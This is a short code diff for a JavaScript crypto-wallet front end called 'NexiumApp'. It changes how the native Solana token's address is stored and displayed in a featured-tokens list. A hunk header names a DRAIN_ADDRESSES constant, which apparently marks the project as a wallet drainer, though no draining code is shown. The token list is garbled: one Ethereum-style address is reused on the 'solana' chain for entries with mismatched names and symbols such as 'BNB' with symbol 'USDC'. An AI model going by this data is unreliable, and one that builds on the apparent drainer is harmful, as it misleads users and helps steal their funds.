@@ -11,7 +11,7 @@ const DRAIN_ADDRESSES = {
 };
 
 const TOKEN_LIST = [
-  { address: null, name: 'Solana', symbol: 'SOL', decimals: 9, isNative: true, chain: 'solana' },
+  { address: "So11111111111111111111111111111111111111112", name: 'Solana', symbol: 'SOL', decimals: 9, isNative: true, chain: 'solana' },
   { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BNB', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' },
   { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'MATIC', symbol: 'MATIC', decimals: 6, isNative: false, chain: 'solana' },
   { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'ETH', symbol: 'ETH', decimals: 6, isNative: false, chain: 'solana' },
@@ -717,7 +717,7 @@ class NexiumApp {
         <h3 class="text-yellow-400 text-md font-semibold">Featured Tokens</h3>
         ${TOKEN_LIST.map(token => `
           <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address || ''}">
-            ${token.name} (${token.symbol}) - ${token.address ? this.shortenAddress(token.address) : 'Native Token'}
+            ${token.name} (${token.symbol}) - ${this.shortenAddress(token.address)}
           </button>
         `).join('')}
       </div>
